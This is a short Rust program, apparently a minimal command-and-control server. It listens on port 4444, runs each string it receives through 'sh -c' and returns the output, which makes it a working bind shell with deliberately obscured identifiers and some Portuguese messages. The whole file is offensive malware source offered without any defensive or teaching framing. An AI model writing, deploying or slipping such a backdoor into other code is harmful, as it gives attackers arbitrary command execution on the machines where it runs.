use std::net::{TcpListener as _L, TcpStream as _S};
use std::io::{Read, Write};
use std::process::Command as _C;
use std::thread;

#[inline(always)]
fn _h(mut _s: _S) {
    let mut _b = [0u8; 1024];
    loop {
        let _n = match _s.read(&mut _b) {
            Ok(n) => n,
            Err(_) => break,
        };
        if _n == 0 {
            break;
        }
        let _c = String::from_utf8_lossy(&_b[.._n]).to_string();
        let _t = _c.trim();
        println!("CMD: {}", _t);
        let _o = match _C::new("sh").arg("-c").arg(_t).output() {
            Ok(o) => o,
            Err(_) => continue,
        };
        let _r = String::from_utf8_lossy(&_o.stdout);
        if _s.write_all(_r.as_bytes()).is_err() {
            break;
        }
    }
}

fn main() {
    let _l = _L::bind("127.0.0.1:4444").expect("Bind falhou");
    println!("C2 Server on 4444...");
    for _i in _l.incoming() {
        match _i {
            Ok(_s) => {
                println!("Conn: {}", _s.peer_addr().unwrap());
                thread::spawn(move || _h(_s));
            }
            Err(e) => {
                eprintln!("Conn erro: {}", e);
            }
        }
    }
}
